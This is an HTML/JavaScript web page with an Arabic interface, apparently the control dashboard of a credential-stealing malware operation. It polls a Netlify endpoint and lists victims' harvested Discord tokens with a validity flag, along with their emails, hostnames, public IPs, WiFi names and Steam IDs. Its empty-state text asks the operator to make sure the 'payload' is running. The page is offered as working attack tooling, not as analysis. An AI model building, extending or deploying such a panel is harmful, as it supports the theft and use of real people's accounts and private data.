<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bro OS - Command Center</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
/* ===== COLOR VARIABLES ===== */
:root {
  --bg-primary: #010305;
  --bg-secondary: #050810;
  --bg-tertiary: #0a0f1a;
  --surface-primary: #0d1525;
  --surface-secondary: #101f34;
  --surface-hover: #131f3a;
  --blue-primary: #00d4ff;
  --blue-glow: #0099ff;
  --blue-light: rgba(0, 212, 255, 0.15);
  --blue-very-light: rgba(0, 212, 255, 0.08);
  --text-primary: #f0f4f9;
  --text-secondary: #b0bcc9;
  --text-muted: #6b7c8f;
  --border-light: rgba(0, 212, 255, 0.08);
  --border-medium: rgba(0, 212, 255, 0.12);
  --shadow-sm: 0 4px 12px rgba(0, 0, 0, 0.3);
  --shadow-md: 0 8px 24px rgba(0, 0, 0, 0.35);
  --shadow-lg: 0 20px 50px rgba(0, 0, 0, 0.45);
  --shadow-xl: 0 30px 60px rgba(0, 0, 0, 0.5);
  --glow-blue: 0 0 20px rgba(0, 212, 255, 0.3);
  --glow-blue-sm: 0 0 12px rgba(0, 212, 255, 0.2);
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

html {
  scroll-behavior: smooth;
}

body {
  min-height: 100vh;
  background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 50%, var(--bg-primary) 100%);
  color: var(--text-primary);
  font-family: 'Inter', 'Segoe UI', sans-serif;
  padding: 28px 16px 50px;
  line-height: 1.6;
  overflow-x: hidden;
}

button {
  font: inherit;
  border: none;
  cursor: pointer;
  transition: transform .16s ease, background-color .16s ease, border-color .16s ease, color .16s ease, opacity .16s ease;
}

::-webkit-scrollbar {
  width: 10px;
}

::-webkit-scrollbar-track {
  background: transparent;
}

::-webkit-scrollbar-thumb {
  background: var(--surface-primary);
  border-radius: 20px;
  border: 3px solid transparent;
  background-clip: padding-box;
  transition: 0.3s;
}

::-webkit-scrollbar-thumb:hover {
  background-color: var(--blue-primary);
  background-clip: padding-box;
}

.wrap {
  max-width: 1040px;
  margin: 0 auto;
}

.topbar {
  height: 56px;
  border-radius: 18px;
  background: linear-gradient(135deg, var(--surface-primary), var(--bg-tertiary));
  border: 1px solid var(--border-medium);
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 20px;
  margin-bottom: 28px;
  box-shadow: var(--shadow-sm), inset 0 1px 0 rgba(0, 212, 255, 0.04);
  animation: slideDown .24s ease-out;
}

@keyframes slideDown {
  from {
    transform: translateY(-30px);
    opacity: 0;
  }
  to {
    transform: translateY(0);
    opacity: 1;
  }
}

.brand {
  display: flex;
  align-items: center;
  gap: 14px;
}

.logo {
  width: 40px;
  height: 40px;
  border-radius: 14px;
  background: linear-gradient(135deg, #0066cc, var(--blue-primary));
  color: white;
  font-weight: 800;
  font-size: 14px;
  display: grid;
  place-items: center;
  box-shadow: 0 0 10px rgba(0, 212, 255, 0.10);
  transition: transform .16s ease, background-color .16s ease, border-color .16s ease, color .16s ease, box-shadow .16s ease;
}

.logo:hover {
  transform: translateY(-2px);
  box-shadow: 0 0 25px rgba(0, 212, 255, 0.4);
}

.brand h1 {
  font-size: 14px;
  font-weight: 700;
  letter-spacing: -0.5px;
}

.brand small {
  display: block;
  font-size: 8px;
  color: var(--text-muted);
  letter-spacing: 1px;
  margin-top: 2px;
  text-transform: uppercase;
}

.top-actions {
  display: flex;
  align-items: center;
  gap: 10px;
}

.online-status {
  display: flex;
  align-items: center;
  gap: 7px;
  padding: 0 14px;
  height: 36px;
  border-radius: 22px;
  background: var(--blue-very-light);
  border: 1px solid var(--border-light);
  font-size: 8px;
  color: var(--text-secondary);
  font-weight: 600;
  letter-spacing: 0.5px;
}

.status-dot {
  width: 7px;
  height: 7px;
  border-radius: 50%;
  background: var(--blue-primary);
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0%, 100% { box-shadow: 0 0 8px var(--blue-primary); }
  50% { box-shadow: 0 0 16px var(--blue-primary); }
}

.tb-btn {
  width: 40px;
  height: 40px;
  border-radius: 12px;
  background: var(--surface-primary);
  color: var(--text-muted);
  border: 1px solid var(--border-light);
  display: grid;
  place-items: center;
  font-size: 16px;
}

.tb-btn:hover {
  background: var(--surface-hover);
  color: var(--blue-primary);
  border-color: var(--border-medium);
  box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
  transform: translateY(-2px);
}

.tb-btn:active {
  transform: translateY(0);
}

.hero {
  height: 52px;
  background: linear-gradient(135deg, var(--surface-primary), var(--bg-tertiary));
  border: 1px solid var(--border-medium);
  border-radius: 18px;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
  margin-bottom: 32px;
  overflow: hidden;
  box-shadow: var(--shadow-sm);
}

.hero::before {
  content: '';
  position: absolute;
  left: 10%;
  right: 30%;
  height: 1px;
  background: linear-gradient(90deg, transparent, var(--blue-glow), transparent);
  opacity: 0.4;
}

.hero h2 {
  position: relative;
  z-index: 1;
  font-size: 18px;
  font-weight: 700;
  direction: ltr;
  letter-spacing: -0.5px;
}

.hero h2 span {
  color: var(--blue-primary);
  text-shadow: 0 0 25px rgba(0, 212, 255, 0.4);
}

.badge {
  position: absolute;
  left: 14px;
  padding: 8px 14px;
  border-radius: 22px;
  background: var(--surface-primary);
  border: 1px solid var(--border-light);
  color: var(--text-muted);
  font-size: 7px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 1px;
}

.section {
  margin-bottom: 22px;
}

.section-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 8px 12px;
  margin-bottom: 12px;
}

.section-header h3 {
  font-size: 12px;
  font-weight: 700;
  display: flex;
  align-items: center;
  gap: 9px;
  color: var(--text-primary);
  letter-spacing: -0.3px;
  text-transform: uppercase;
}

.section-header h3 i {
  color: var(--blue-primary);
  font-size: 13px;
}

.badge-count {
  padding: 5px 12px;
  border-radius: 24px;
  background: var(--blue-very-light);
  border: 1px solid var(--border-light);
  color: var(--text-secondary);
  font-size: 8px;
  font-weight: 600;
}

.panel {
  background: linear-gradient(135deg, var(--surface-primary), var(--bg-tertiary));
  border: 1px solid var(--border-light);
  border-radius: 16px;
  padding: 14px;
  min-height: 100px;
  box-shadow: var(--shadow-sm);
  animation: fadeIn .2s ease-out;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(10px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.person-wrap {
  margin-bottom: 10px;
}

.person-row {
  min-height: 60px;
  border-radius: 14px;
  background: var(--surface-primary);
  border: 1px solid var(--border-light);
  display: grid;
  grid-template-columns: 52px 1fr 1fr 50px;
  align-items: center;
  gap: 14px;
  padding: 12px 14px;
  direction: ltr;
  transition: transform .16s ease, background-color .16s ease, border-color .16s ease, box-shadow .16s ease;
  position: relative;
  overflow: hidden;
}

.person-row::before {
  content: '';
  position: absolute;
  inset: 0;
  background: linear-gradient(135deg, transparent, rgba(0, 212, 255, 0.05), transparent);
  opacity: 0;
  transition: opacity 0.3s ease;
  pointer-events: none;
}

.person-row:hover {
  background: var(--surface-hover);
  border-color: var(--border-medium);
  transform: translateY(-3px);
  box-shadow: 0 8px 22px rgba(0,0,0,.24);
}

.person-row:hover::before {
  opacity: 1;
}

.person-icon {
  width: 42px;
  height: 42px;
  border-radius: 12px;
  background: var(--blue-very-light);
  display: grid;
  place-items: center;
  color: var(--blue-primary);
  font-size: 15px;
  font-weight: 600;
  box-shadow: 0 0 10px rgba(0, 212, 255, 0.10);
}

.person-name,
.person-email {
  direction: ltr;
  text-align: left;
  font-size: 14px;
  font-weight: 700;
  color: var(--text-primary);
}

.person-email {
  font-size: 12px;
  color: var(--text-secondary);
  font-weight: 400;
}

.pc-btn {
  width: 42px;
  height: 42px;
  border-radius: 12px;
  justify-self: end;
  background: var(--blue-very-light);
  color: var(--blue-primary);
  border: 1px solid var(--border-light);
  display: grid;
  place-items: center;
  font-size: 16px;
}

.pc-btn:hover {
  transform: translateY(-3px) scale(1.05);
  background: var(--blue-light);
  box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
  border-color: var(--border-medium);
}

.pc-btn:active {
  transform: translateY(-1px) scale(1);
}

.empty-state {
  text-align: center;
  padding: 40px 0;
  color: var(--text-muted);
}

.empty-state i {
  font-size: 24px;
  margin-bottom: 12px;
  display: block;
}

.empty-state span {
  font-size: 14px;
}

.empty-state .sub {
  margin-top: 8px;
  font-size: 12px;
  color: #3a4a5a;
}

.modal-overlay {
  position: fixed;
  inset: 0;
  background: rgba(1, 3, 5, 0.9);
  opacity: 0;
  pointer-events: none;
  transition: opacity .16s ease;
  z-index: 999;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px;
}

.modal-overlay.show {
  opacity: 1;
  pointer-events: auto;
}

body.modal-open {
  overflow: hidden;
}

.modal-content {
  width: 100%;
  max-width: 660px;
  background: linear-gradient(135deg, var(--surface-primary), var(--bg-tertiary));
  border: 1px solid rgba(0, 212, 255, 0.15);
  border-radius: 20px;
  padding: 28px;
  box-shadow: 0 24px 54px rgba(0,0,0,.42);
  max-height: 90vh;
  overflow-y: auto;
  transform: translateY(8px) scale(.985);
  transition: transform .16s ease;
}

.modal-overlay.show .modal-content {
  transform: translateY(0) scale(1);
}

.modal-header {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  gap: 16px;
  margin-bottom: 24px;
  padding-bottom: 20px;
  border-bottom: 1px solid var(--border-light);
}

.modal-close {
  width: 40px;
  height: 40px;
  border-radius: 12px;
  background: var(--surface-primary);
  color: var(--text-muted);
  border: 1px solid var(--border-light);
  display: grid;
  place-items: center;
  flex-shrink: 0;
  font-size: 18px;
}

.modal-close:hover {
  background: var(--surface-hover);
  color: var(--blue-primary);
  border-color: var(--border-medium);
  box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
  transform: rotate(90deg);
}

.modal-profile {
  display: flex;
  gap: 14px;
  align-items: flex-start;
  flex: 1;
  direction: ltr;
}

.modal-info-left {
  flex: 1;
}

.modal-profile h3 {
  font-size: 14px;
  font-weight: 700;
  color: var(--text-primary);
  margin-bottom: 6px;
}

.modal-profile p {
  font-size: 12px;
  color: var(--text-muted);
}

.modal-avatar {
  width: 52px;
  height: 52px;
  border-radius: 14px;
  background: linear-gradient(135deg, var(--blue-very-light), rgba(0, 212, 255, 0.12));
  color: var(--blue-primary);
  display: grid;
  place-items: center;
  font-size: 22px;
  flex-shrink: 0;
  box-shadow: 0 0 10px rgba(0, 212, 255, 0.10);
}

.modal-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 12px;
  margin-bottom: 22px;
}

.modal-item {
  background: var(--surface-primary);
  border: 1px solid var(--border-light);
  border-radius: 12px;
  padding: 13px;
  transition: transform .16s ease, background-color .16s ease, border-color .16s ease, color .16s ease, box-shadow .16s ease;
}

.modal-item:hover {
  border-color: var(--border-medium);
  background: var(--surface-hover);
  box-shadow: 0 0 15px rgba(0, 212, 255, 0.1);
  transform: translateY(-2px);
}

.modal-item span {
  display: block;
  font-size: 8px;
  color: var(--text-muted);
  margin-bottom: 7px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.modal-item b {
  display: block;
  font-size: 11px;
  color: var(--text-primary);
  font-weight: 600;
  word-break: break-word;
  direction: ltr;
  text-align: left;
}

.modal-item.full {
  grid-column: 1 / -1;
}

.token-display {
  font-family: 'JetBrains Mono', monospace;
  font-size: 10px;
  color: var(--blue-primary);
  letter-spacing: 0.5px;
  background: rgba(0, 212, 255, 0.08);
  padding: 8px 10px;
  border-radius: 8px;
  display: inline-block;
  margin-top: 6px;
  box-shadow: 0 0 10px rgba(0, 212, 255, 0.10);
}

.modal-screenshot {
  border-top: 1px solid var(--border-light);
  padding-top: 18px;
}

.screenshot-title {
  font-size: 12px;
  font-weight: 700;
  margin-bottom: 12px;
  color: var(--text-primary);
}

.screenshot-placeholder {
  background: var(--surface-primary);
  border: 2px dashed var(--border-medium);
  border-radius: 12px;
  padding: 20px;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  gap: 10px;
  transition: transform .16s ease, background-color .16s ease, border-color .16s ease, color .16s ease, box-shadow .16s ease;
  cursor: pointer;
}

.screenshot-placeholder:hover {
  background: var(--surface-hover);
  border-color: var(--blue-primary);
  box-shadow: 0 0 20px rgba(0, 212, 255, 0.2);
}

.screenshot-placeholder i {
  font-size: 28px;
  color: var(--text-muted);
}

.screenshot-placeholder span {
  font-size: 11px;
  color: var(--text-secondary);
  font-weight: 500;
}

.footer {
  text-align: center;
  color: var(--text-muted);
  font-size: 8px;
  margin-top: 32px;
  font-weight: 600;
  letter-spacing: 1px;
  text-transform: uppercase;
}

@media (max-width: 768px) {
  body {
    padding: 16px 10px 35px;
  }

  .topbar {
    height: 52px;
    padding: 0 14px;
  }

  .hero h2 {
    font-size: 16px;
  }

  .section-header h3 {
    font-size: 11px;
  }

  .person-row {
    grid-template-columns: 46px 1fr 46px;
  }

  .person-email {
    display: none;
  }

  .modal-grid {
    grid-template-columns: repeat(2, 1fr);
  }

  .modal-content {
    padding: 20px;
  }
}

@media (max-width: 480px) {
  .brand small {
    display: none;
  }

  .top-actions {
    gap: 6px;
  }

  .tb-btn {
    width: 36px;
    height: 36px;
  }

  .person-row {
    grid-template-columns: 40px 1fr 40px;
  }

  .modal-grid {
    grid-template-columns: 1fr;
  }

  .section-header {
    flex-direction: column;
    align-items: flex-start;
    gap: 8px;
  }
}

.wrap,
.topbar,
.hero,
.panel,
.person-row,
.modal-content {
  transform: translateZ(0);
}

.person-row,
.pc-btn,
.tb-btn,
.modal-item,
.modal-close {
  will-change: transform;
}

.logo {
  letter-spacing: .4px;
}

.brand h1 {
  white-space: nowrap;
}
</style>
</head>
<body>
<div class="wrap">
  <div class="topbar">
    <div class="brand">
      <div class="logo">BR</div>
      <div>
        <h1>Bro OS</h1>
        <small>Command Center · v4.0</small>
      </div>
    </div>
    <div class="top-actions">
      <div class="online-status">
        <div class="status-dot"></div>
        <span id="clock">00:00:00</span>
      </div>
      <button class="tb-btn" onclick="fetchData()" title="Refresh"><i class="fa-solid fa-rotate"></i></button>
      <button class="tb-btn" title="Settings"><i class="fa-solid fa-gear"></i></button>
    </div>
  </div>

  <div class="hero">
    <h2>People <span>Center</span></h2>
    <span class="badge">Bro OS v4.0</span>
  </div>

  <section class="section">
    <div class="section-header">
      <h3><i class="fa-solid fa-users"></i> المستخدمين المستخرجين</h3>
      <span class="badge-count" id="peopleCount">0 حسابات</span>
    </div>
    <div class="panel" id="peoplePanel"></div>
  </section>

  <div class="footer">© Bro OS v4.0 · Dynamic Edition · All Rights Reserved</div>
</div>

<div class="modal-overlay" id="personModal">
  <div class="modal-content">
    <div class="modal-header">
      <button class="modal-close" onclick="closePersonModal()">
        <i class="fa-solid fa-xmark"></i>
      </button>
      <div class="modal-profile">
        <div class="modal-info-left">
          <h3 id="mName">User Name</h3>
          <p id="mEmailTop">test@gmail.com</p>
        </div>
        <div class="modal-avatar"><i class="fa-solid fa-user"></i></div>
      </div>
    </div>

    <div class="modal-grid">
      <div class="modal-item"><span>Device</span><b id="mDevice">-</b></div>
      <div class="modal-item"><span>Email</span><b id="mEmail">-</b></div>
      <div class="modal-item"><span>Discord</span><b id="mDiscord">-</b></div>
      <div class="modal-item"><span>OS</span><b id="mOs">-</b></div>
      <div class="modal-item"><span>IP</span><b id="mIp">-</b></div>
      <div class="modal-item"><span>Status</span><b id="mStatus">-</b></div>
      <div class="modal-item"><span>Last Seen</span><b id="mLast">-</b></div>
      <div class="modal-item"><span>WiFi</span><b id="mWifi">-</b></div>
      <div class="modal-item"><span>Steam</span><b id="mSteam">-</b></div>
      <div class="modal-item full">
        <span>Token</span>
        <b id="mToken" class="token-display">-</b>
      </div>
      <div class="modal-item full"><span>Notes</span><b id="mNotes">-</b></div>
    </div>

    <div class="modal-screenshot">
      <div class="screenshot-title">Screenshot</div>
      <div class="screenshot-placeholder">
        <i class="fa-regular fa-image"></i>
        <span id="screenshotName">No screenshot yet</span>
      </div>
    </div>
  </div>
</div>

<script>
// ===== SCRIPT =====
let people = [];
let lastData = null;

async function fetchData() {
    try {
        // جلب البيانات من Netlify Functions
        const response = await fetch('/.netlify/functions/data?latest=true');
        const result = await response.json();
        
        if (result.data && result.data.length > 0) {
            lastData = result.data[0];
            updateUI(lastData);
        } else {
            showEmptyState();
        }
    } catch (e) {
        console.log('No data yet:', e);
        showEmptyState();
    }
}

function updateUI(data) {
    const computer = data.computer || {};
    const tokens = data.discord_tokens || [];
    const passwords = data.passwords || [];
    const wifi = data.wifi || [];
    const gaming = data.gaming_accounts || [];
    
    if (tokens.length > 0) {
        people = tokens.map((token, index) => {
            const is_valid = token.valid === true;
            return {
                name: token.username || `User ${index + 1}`,
                email: token.email || 'No email',
                discord: `${token.username || 'Unknown'}#${token.discriminator || '0000'}`,
                device: computer.hostname || 'Unknown Device',
                status: is_valid ? 'Online' : 'Offline',
                ip: computer.public_ip || '0.0.0.0',
                os: computer.os || 'Unknown OS',
                steam: gaming.length > 0 ? gaming[0].steamid || 'Not linked' : 'Not linked',
                wifi: wifi.length > 0 ? wifi[0].ssid || 'No WiFi' : 'No WiFi',
                last: data.timestamp || new Date().toISOString(),
                notes: is_valid ? 'Token Valid' : 'Token Invalid',
                token: token.token || 'No token'
            };
        });
    }
    
    render();
}

function showEmptyState() {
    const panel = document.getElementById("peoplePanel");
    const countEl = document.getElementById("peopleCount");
    if (!panel) return;

    panel.innerHTML = `
        <div class="empty-state">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
            <span>انتظار وصول البيانات من الجهاز...</span>
            <div class="sub"><i class="fa-solid fa-server"></i> تأكد من تشغيل الـ payload</div>
        </div>
    `;
    if (countEl) countEl.textContent = '0 حسابات';
}

function render() {
    const panel = document.getElementById("peoplePanel");
    const countEl = document.getElementById("peopleCount");
    if (!panel) return;

    if (people.length === 0) {
        showEmptyState();
        return;
    }

    if (countEl) countEl.textContent = people.length + ' حسابات';

    panel.innerHTML = people.map((p, i) => `
        <div class="person-wrap">
            <div class="person-row">
                <div class="person-icon"><i class="fa-solid fa-user"></i></div>
                <div class="person-name">${p.name || 'Unknown'}</div>
                <div class="person-email">${p.email || 'No email'}</div>
                <button class="pc-btn" onclick="openPersonModal(${i})" title="عرض التفاصيل">
                    <i class="fa-solid fa-computer"></i>
                </button>
            </div>
        </div>
    `).join("");
}

function openPersonModal(i) {
    const p = people[i];
    if (!p) return;

    const els = {
        mName: document.getElementById("mName"),
        mEmailTop: document.getElementById("mEmailTop"),
        mDiscord: document.getElementById("mDiscord"),
        mEmail: document.getElementById("mEmail"),
        mDevice: document.getElementById("mDevice"),
        mStatus: document.getElementById("mStatus"),
        mIp: document.getElementById("mIp"),
        mOs: document.getElementById("mOs"),
        mSteam: document.getElementById("mSteam"),
        mWifi: document.getElementById("mWifi"),
        mLast: document.getElementById("mLast"),
        mNotes: document.getElementById("mNotes"),
        mToken: document.getElementById("mToken")
    };

    if (els.mName) els.mName.textContent = p.name || 'Unknown';
    if (els.mEmailTop) els.mEmailTop.textContent = p.email || 'No email';
    if (els.mDiscord) els.mDiscord.textContent = p.discord || 'No Discord';
    if (els.mEmail) els.mEmail.textContent = p.email || 'No email';
    if (els.mDevice) els.mDevice.textContent = p.device || 'Unknown';
    if (els.mStatus) els.mStatus.textContent = p.status || 'Offline';
    if (els.mIp) els.mIp.textContent = p.ip || '0.0.0.0';
    if (els.mOs) els.mOs.textContent = p.os || 'Unknown';
    if (els.mSteam) els.mSteam.textContent = p.steam || 'Not linked';
    if (els.mWifi) els.mWifi.textContent = p.wifi || 'No WiFi';
    if (els.mLast) els.mLast.textContent = p.last || 'Never';
    if (els.mNotes) els.mNotes.textContent = p.notes || 'No notes';
    if (els.mToken) els.mToken.textContent = p.token || 'No token';

    const modal = document.getElementById("personModal");
    if (modal) modal.classList.add("show");
    document.body.classList.add("modal-open");
}

function closePersonModal() {
    const modal = document.getElementById("personModal");
    if (modal) modal.classList.remove("show");
    document.body.classList.remove("modal-open");
}

function clock() {
    const clockEl = document.getElementById("clock");
    if (clockEl) clockEl.textContent = new Date().toTimeString().slice(0, 8);
}

// جلب البيانات كل 5 ثواني
setInterval(fetchData, 5000);

document.addEventListener("keydown", (e) => {
    if (e.key === "Escape") closePersonModal();
});

setInterval(clock, 1000);
clock();

// جلب أولي للبيانات
fetchData();
</script>
</body>
</html>
